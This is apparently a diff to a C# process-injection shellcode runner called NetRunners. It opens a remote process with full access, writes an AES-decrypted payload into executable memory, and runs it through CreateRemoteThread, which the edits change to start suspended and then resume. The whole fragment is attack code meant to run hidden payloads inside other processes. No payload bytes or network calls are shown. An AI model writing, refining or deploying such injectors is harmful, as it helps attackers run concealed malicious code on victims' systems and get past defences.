@@ -34,7 +34,7 @@ namespace NetRunners.Runners
             {
                 //Open remote process
                 processID = process.Id;
-                hProcess = OpenProcess(0x001F0FFF, 0, (uint)process.Id);
+                hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, (uint)process.Id);
                 IsWow64Process(hProcess, out IsRemote32BitProcess);
 
                 foreach (ProcessThread thread in process.Threads)
@@ -61,7 +61,7 @@ namespace NetRunners.Runners
             Console.WriteLine("[+] Executable Memory Address (VirtualAllocEx) to remote processID-> " + processID + " on Mem.Address ->" + "0x" + allocAddressHex);
 
             // select and decrypt payload
-            buf = SelectPayloadArchitecture();
+            buf = SelectPayloadArchitecture(IsRemote32BitProcess);
             buf = DecryptBytesToBytesAes(buf, AesKey);
 
             unsafe
@@ -93,7 +93,10 @@ namespace NetRunners.Runners
             }
 
             //Create a remote thread and execute it
-            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pRMemory, IntPtr.Zero, 0, IntPtr.Zero);
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pRMemory, IntPtr.Zero, 0x04, IntPtr.Zero);
+
+            // resume thread
+            ResumeThread(hThread);
 
             //Enumerate threads from the given process.
             ProcessThreadCollection threads = Process.GetProcessById(processID).Threads;
